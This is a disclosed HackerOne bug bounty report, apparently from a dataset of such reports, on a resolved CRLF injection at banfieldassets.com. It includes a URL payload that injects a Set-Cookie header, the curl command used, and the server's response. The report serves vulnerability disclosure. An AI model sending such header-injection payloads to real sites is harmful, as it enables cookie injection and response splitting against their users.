---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '1943013'
original_report_id: '1943013'
title: CRLF Inection at `banfieldassets.com`
weakness: CRLF Injection
team_handle: mars
created_at: '2023-04-11T20:55:52.263Z'
disclosed_at: '2023-06-23T14:58:24.201Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 10
asset_identifier: '*.banfieldassets.com'
asset_type: WILDCARD
max_severity: critical
tags:
- hackerone
- crlf-injection
---

# CRLF Inection at `banfieldassets.com`

## Metadata

- HackerOne Report ID: 1943013
- Weakness: CRLF Injection
- Program: mars
- Disclosed At: 2023-06-23T14:58:24.201Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

## Summary:

A CRLF Injection attack occurs when a user manages to submit a CRLF into an application. This is most commonly done by modifying an HTTP parameter or URL.

## Steps To Reproduce:

Navigate to this URL
http://www.banfieldassets.com/%0D%0ASet-Cookie:%20CRLF_Injection_By_ze2pac

## PoC:
```
┌──(azab㉿kali)-[~]
└─$ curl -i http://www.banfieldassets.com/%0D%0ASet-Cookie:%20CRLF_Injection_By_ze2pac 
HTTP/1.1 307 Temporary Redirect
Date: Tue, 11 Apr 2023 20:51:09 GMT
Content-Type: text/html
Content-Length: 164
Connection: keep-alive
Server: nginx
Location: https://banfieldassets.widencollective.com/
Set-Cookie: CRLF_Injection_By_ze2pac

<html>
<head><title>307 Temporary Redirect</title></head>
<body>
<center><h1>307 Temporary Redirect</h1></center>
<hr><center>nginx</center>
</body>
</html>
```

## Impact

XSS, Open Redirect, HTTP Response Splitting... etc.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
